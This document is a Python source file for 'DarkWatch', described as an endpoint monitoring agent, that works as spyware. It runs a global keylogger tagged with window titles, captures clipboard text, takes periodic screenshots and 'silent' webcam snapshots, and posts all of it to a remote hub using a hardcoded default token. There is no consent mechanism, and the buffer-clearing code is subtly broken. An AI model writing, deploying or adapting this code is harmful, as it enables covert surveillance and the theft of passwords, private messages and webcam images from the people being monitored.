"""
===================================================================
DarkWatch Endpoint Telemetry & Monitoring Agent (Client Node)
Description: Production-ready multi-threaded agent collecting:
             1. System Metrics & Network State (psutil)
             2. Keystroke Buffer & Active Window Titles (pynput + pywin32)
             3. Clipboard Capture (win32clipboard)
             4. Periodic Screen Capture (PIL.ImageGrab)
             5. Silent WebCam Snaps (OpenCV)
             Streaming all data back to DarkWatch Hub securely.
===================================================================
"""

import os
import sys
import io
import time
import json
import socket
import platform
import datetime
import uuid
import threading
import requests
import psutil

# Platform-specific imports for Windows
IS_WINDOWS = sys.platform.startswith("win")
if IS_WINDOWS:
    try:
        import win32gui
        import win32clipboard
    except ImportError:
        win32gui = None
        win32clipboard = None
else:
    win32gui = None
    win32clipboard = None

# Optional input and media libraries
try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import cv2
    HAS_OPENCV = True
except ImportError:
    HAS_OPENCV = False

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent_config.json")


def load_agent_config():
    default_config = {
        "server_base_url": "http://127.0.0.1:5000",
        "agent_token": "DarkWatch-Telemetry-Key-2026",
        "poll_interval_seconds": 10,
        "modules": {
            "system_metrics": True,
            "keystrokes": True,
            "screenshots": True,
            "webcam": True,
            "clipboard": True
        },
        "intervals": {
            "metrics_seconds": 10,
            "data_flush_seconds": 30,
            "screenshot_seconds": 120,
            "webcam_seconds": 300
        }
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8-sig") as f:
                data = json.load(f)
                default_config.update(data)
        except Exception as e:
            print(f"[!] Warning reading agent config: {e}")

    # Environment variable overrides
    default_config["server_base_url"] = os.environ.get("DARKWATCH_SERVER_URL", default_config.get("server_base_url", "http://127.0.0.1:5000")).rstrip("/")
    if default_config["server_base_url"].endswith("/api/telemetry/ingest"):
        default_config["server_base_url"] = default_config["server_base_url"].replace("/api/telemetry/ingest", "")
    default_config["agent_token"] = os.environ.get("DARKWATCH_AGENT_TOKEN", default_config["agent_token"])
    return default_config


class UnifiedEndpointAgent:
    def __init__(self, config):
        self.config = config
        self.base_url = config.get("server_base_url", "http://127.0.0.1:5000").rstrip("/")
        self.token = config.get("agent_token", "DarkWatch-Telemetry-Key-2026")
        self.modules = config.get("modules", {})
        self.intervals = config.get("intervals", {})

        self.device_id = self._get_or_create_device_id()
        self.hostname = socket.gethostname()
        self.is_running = False

        # Thread synchronization and in-memory buffers
        self.lock = threading.Lock()
        self.keystroke_buffer = []
        self.clipboard_buffer = []
        self.current_window = ""
        self.last_clipboard = ""

        # Listeners / Threads
        self.keyboard_listener = None
        self.threads = []

    def _get_or_create_device_id(self):
        id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".device_id")
        if os.path.exists(id_file):
            try:
                with open(id_file, "r") as f:
                    content = f.read().strip()
                    if content:
                        return content
            except Exception:
                pass
        new_id = f"{socket.gethostname().lower()}-{uuid.uuid4().hex[:8]}"
        try:
            with open(id_file, "w") as f:
                f.write(new_id)
        except Exception:
            pass
        return new_id

    def get_headers(self):
        return {
            "X-Agent-Token": self.token
        }

    def get_active_window(self):
        if IS_WINDOWS and win32gui:
            try:
                hwnd = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(hwnd)
                return title.strip() if title else "Desktop / System"
            except Exception:
                return "Active Window"
        return platform.system() + " Window"

    # =========================================================================
    # 1. KEYSTROKE COLLECTOR (pynput)
    # =========================================================================
    def on_key_press(self, key):
        if not self.modules.get("keystrokes", True):
            return

        with self.lock:
            win_title = self.get_active_window()
            if win_title != self.current_window:
                self.current_window = win_title
                ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                header = f"\n\n[ Window: {self.current_window} | Time: {ts} ]\n"
                self.keystroke_buffer.append(header)

            try:
                key_char = key.char
                if key_char is None:
                    key_str = f"[{str(key)}]"
                else:
                    key_str = key_char
            except AttributeError:
                if key == keyboard.Key.space:
                    key_str = " "
                elif key == keyboard.Key.enter:
                    key_str = "\n"
                elif key == keyboard.Key.tab:
                    key_str = "\t"
                elif key == keyboard.Key.backspace:
                    key_str = "[BACKSPACE]"
                else:
                    key_name = str(key).replace("Key.", "").upper()
                    key_str = f"[{key_name}]"

            self.keystroke_buffer.append(key_str)

            # Cap buffer in memory if offline for a long time (max 50,000 items)
            if len(self.keystroke_buffer) > 50000:
                self.keystroke_buffer = self.keystroke_buffer[-50000:]

    # =========================================================================
    # 2. CLIPBOARD MONITOR (win32clipboard)
    # =========================================================================
    def check_clipboard(self):
        if not self.modules.get("clipboard", True) or not IS_WINDOWS or not win32clipboard:
            return

        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                win32clipboard.CloseClipboard()

                if data and data != self.last_clipboard:
                    self.last_clipboard = data
                    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    entry = f"[{ts}] Clipboard Copy:\n{data}\n----------------------------------------\n"
                    with self.lock:
                        self.clipboard_buffer.append(entry)
            else:
                win32clipboard.CloseClipboard()
        except Exception:
            pass

    # =========================================================================
    # 3. SCREENSHOT COLLECTOR (Pillow)
    # =========================================================================
    def capture_screenshot(self):
        if not self.modules.get("screenshots", True) or not HAS_PIL:
            return

        try:
            img = ImageGrab.grab()
            if not img:
                return

            # Compress to JPEG in memory for efficient network bandwidth
            buf = io.BytesIO()
            img.convert("RGB").save(buf, format="JPEG", quality=65)
            buf.seek(0)

            url = f"{self.base_url}/api/telemetry/media"
            files = {
                "file": (f"screenshot_{int(time.time())}.jpg", buf, "image/jpeg")
            }
            data = {
                "device_id": self.device_id,
                "category": "screenshots"
            }

            resp = requests.post(url, data=data, files=files, headers=self.get_headers(), timeout=10)
            if resp.status_code == 200:
                print(f"[+] [{datetime.datetime.now().strftime('%H:%M:%S')}] Screenshot dispatched to server (HTTP 200)")
        except Exception as e:
            print(f"[!] Screenshot upload error: {e}")

    # =========================================================================
    # 4. WEBCAM SNAPSHOT (OpenCV)
    # =========================================================================
    def capture_webcam(self):
        if not self.modules.get("webcam", True) or not HAS_OPENCV:
            return

        try:
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW if IS_WINDOWS else cv2.CAP_ANY)
            if not cam.isOpened():
                return

            ret, frame = cam.read()
            cam.release()

            if ret and frame is not None:
                # Encode frame to JPEG buffer in memory
                success, encoded_img = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                if not success:
                    return

                buf = io.BytesIO(encoded_img.tobytes())
                url = f"{self.base_url}/api/telemetry/media"
                files = {
                    "file": (f"webcam_{int(time.time())}.jpg", buf, "image/jpeg")
                }
                data = {
                    "device_id": self.device_id,
                    "category": "webcam"
                }

                resp = requests.post(url, data=data, files=files, headers=self.get_headers(), timeout=10)
                if resp.status_code == 200:
                    print(f"[+] [{datetime.datetime.now().strftime('%H:%M:%S')}] WebCam snap dispatched to server (HTTP 200)")
        except Exception as e:
            print(f"[!] WebCam snap error: {e}")

    # =========================================================================
    # 5. DATA FLUSHER (Keystrokes & Clipboard Text)
    # =========================================================================
    def flush_text_data(self):
        with self.lock:
            keys_to_send = "".join(self.keystroke_buffer)
            clip_to_send = "".join(self.clipboard_buffer)

        if not keys_to_send and not clip_to_send:
            return

        payload = {
            "device_id": self.device_id,
            "keystrokes": keys_to_send,
            "clipboard": clip_to_send,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        url = f"{self.base_url}/api/telemetry/data"
        headers = self.get_headers()
        headers["Content-Type"] = "application/json"

        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            if resp.status_code == 200:
                print(f"[+] [{datetime.datetime.now().strftime('%H:%M:%S')}] Buffered text data flushed ({len(keys_to_send)} chars keys, {len(clip_to_send)} chars clip)")
                # Clear sent buffer
                with self.lock:
                    self.keystroke_buffer = self.keystroke_buffer[len(keys_to_send):] if len(keys_to_send) < len("".join(self.keystroke_buffer)) else []
                    self.clipboard_buffer = self.clipboard_buffer[len(clip_to_send):] if len(clip_to_send) < len("".join(self.clipboard_buffer)) else []
        except Exception as e:
            print(f"[-] Disconnect/Retry: Text data flush deferred ({e})")

    # =========================================================================
    # 6. SYSTEM METRICS COLLECTOR (CPU, RAM, Disk, Sockets, Processes)
    # =========================================================================
    def collect_system_metrics(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = "127.0.0.1"

        cpu_pct = psutil.cpu_percent(interval=0.5)
        vmem = psutil.virtual_memory()

        system_drive = "C:\\" if IS_WINDOWS else "/"
        try:
            disk = psutil.disk_usage(system_drive)
            disk_total_gb = round(disk.total / (1024 ** 3), 1)
            disk_used_gb = round(disk.used / (1024 ** 3), 1)
            disk_free_gb = round(disk.free / (1024 ** 3), 1)
            disk_pct = disk.percent
        except Exception:
            disk_total_gb = disk_used_gb = disk_free_gb = disk_pct = 0

        # Processes
        top_procs = []
        proc_count = 0
        try:
            for p in psutil.process_iter(['name', 'cpu_percent', 'memory_percent', 'status']):
                proc_count += 1
                try:
                    info = p.info
                    mem = info.get('memory_percent') or 0
                    if mem > 1.5:
                        top_procs.append({
                            "name": info.get('name') or "unknown",
                            "memory_pct": round(mem, 1),
                            "cpu_pct": round(info.get('cpu_percent') or 0, 1),
                            "status": info.get('status') or "running"
                        })
                except Exception:
                    pass
        except Exception:
            pass

        top_procs.sort(key=lambda x: x["memory_pct"], reverse=True)

        # Network Sockets
        listening_ports = []
        active_conns = []
        try:
            connections = psutil.net_connections(kind='inet')
            for c in connections:
                if c.status == 'LISTEN' and c.laddr:
                    if c.laddr.port not in listening_ports:
                        listening_ports.append(c.laddr.port)
                elif c.status == 'ESTABLISHED' and c.raddr:
                    active_conns.append({
                        "local_port": c.laddr.port if c.laddr else 0,
                        "remote_ip": c.raddr.ip,
                        "remote_port": c.raddr.port,
                        "status": c.status
                    })
        except Exception:
            pass

        return {
            "device_identification": {
                "device_id": self.device_id,
                "hostname": self.hostname,
                "os_name": platform.system(),
                "os_release": platform.release(),
                "os_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "local_ip": local_ip,
                "boot_time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            },
            "system_performance": {
                "cpu_percent": cpu_pct,
                "ram_percent": vmem.percent,
                "ram_total_gb": round(vmem.total / (1024 ** 3), 1),
                "ram_used_gb": round(vmem.used / (1024 ** 3), 1),
                "ram_free_gb": round(vmem.available / (1024 ** 3), 1),
                "disk_percent": disk_pct,
                "disk_total_gb": disk_total_gb,
                "disk_used_gb": disk_used_gb,
                "disk_free_gb": disk_free_gb
            },
            "operational_health": {
                "uptime_hours": round((time.time() - psutil.boot_time()) / 3600.0, 1),
                "total_processes": proc_count,
                "top_processes": top_procs[:10]
            },
            "security_state": {
                "total_established": len(active_conns),
                "listening_ports": sorted(listening_ports)[:15],
                "active_connections": active_conns[:15]
            },
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    def flush_system_metrics(self):
        packet = self.collect_system_metrics()
        url = f"{self.base_url}/api/telemetry/ingest"
        headers = self.get_headers()
        headers["Content-Type"] = "application/json"

        try:
            resp = requests.post(url, json=packet, headers=headers, timeout=5)
            if resp.status_code == 200:
                print(f"[+] [{datetime.datetime.now().strftime('%H:%M:%S')}] Metrics stream OK -> {self.base_url}")
        except Exception as e:
            print(f"[-] Disconnect/Retry: Unable to reach DarkWatch Hub ({e})")

    # =========================================================================
    # WORKER LOOPS
    # =========================================================================
    def _metrics_loop(self):
        interval = self.intervals.get("metrics_seconds", 10)
        while self.is_running:
            self.flush_system_metrics()
            time.sleep(interval)

    def _data_flush_loop(self):
        interval = self.intervals.get("data_flush_seconds", 30)
        while self.is_running:
            time.sleep(interval)
            self.flush_text_data()

    def _clipboard_loop(self):
        while self.is_running:
            self.check_clipboard()
            time.sleep(2)

    def _screenshot_loop(self):
        interval = self.intervals.get("screenshot_seconds", 120)
        time.sleep(10)  # Initial delay
        while self.is_running:
            self.capture_screenshot()
            time.sleep(interval)

    def _webcam_loop(self):
        interval = self.intervals.get("webcam_seconds", 300)
        time.sleep(20)  # Initial delay
        while self.is_running:
            self.capture_webcam()
            time.sleep(interval)

    # =========================================================================
    # LIFECYCLE
    # =========================================================================
    def start(self):
        self.is_running = True

        print("=" * 65)
        print("   DARKWATCH FULL-SPECTRUM ENDPOINT MONITORING AGENT")
        print("=" * 65)
        print(f"[*] Node Device ID      : {self.device_id}")
        print(f"[*] Device Hostname     : {self.hostname}")
        print(f"[*] DarkWatch Hub Target: {self.base_url}")
        print(f"[*] Active Modules      : {', '.join([k for k, v in self.modules.items() if v])}")
        print("-" * 65)

        # 1. Start keyboard listener
        if self.modules.get("keystrokes", True) and HAS_PYNPUT:
            try:
                self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
                self.keyboard_listener.start()
                print("[+] Global Keystroke Collector active")
            except Exception as e:
                print(f"[!] Keystroke hook error: {e}")

        # 2. Start background worker threads
        if self.modules.get("system_metrics", True):
            t_met = threading.Thread(target=self._metrics_loop, daemon=True, name="MetricsWorker")
            t_met.start()
            self.threads.append(t_met)

        t_data = threading.Thread(target=self._data_flush_loop, daemon=True, name="DataFlushWorker")
        t_data.start()
        self.threads.append(t_data)

        if self.modules.get("clipboard", True) and IS_WINDOWS:
            t_clip = threading.Thread(target=self._clipboard_loop, daemon=True, name="ClipboardWorker")
            t_clip.start()
            self.threads.append(t_clip)
            print("[+] Clipboard Monitor active")

        if self.modules.get("screenshots", True) and HAS_PIL:
            t_scr = threading.Thread(target=self._screenshot_loop, daemon=True, name="ScreenshotWorker")
            t_scr.start()
            self.threads.append(t_scr)
            print("[+] Periodic Screen Grabber active")

        if self.modules.get("webcam", True) and HAS_OPENCV:
            t_cam = threading.Thread(target=self._webcam_loop, daemon=True, name="WebcamWorker")
            t_cam.start()
            self.threads.append(t_cam)
            print("[+] Silent WebCam Snapshot active")

        print("[*] All collectors running. Press Ctrl+C to terminate agent.\n")

        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        print("\n[*] Stopping DarkWatch Endpoint Agent...")
        self.is_running = False
        # Flush any remaining buffer before exiting
        self.flush_text_data()
        if self.keyboard_listener:
            try:
                self.keyboard_listener.stop()
            except Exception:
                pass
        print("[*] Agent stopped cleanly.")


def main():
    cfg = load_agent_config()
    agent = UnifiedEndpointAgent(cfg)
    agent.start()


if __name__ == "__main__":
    main()
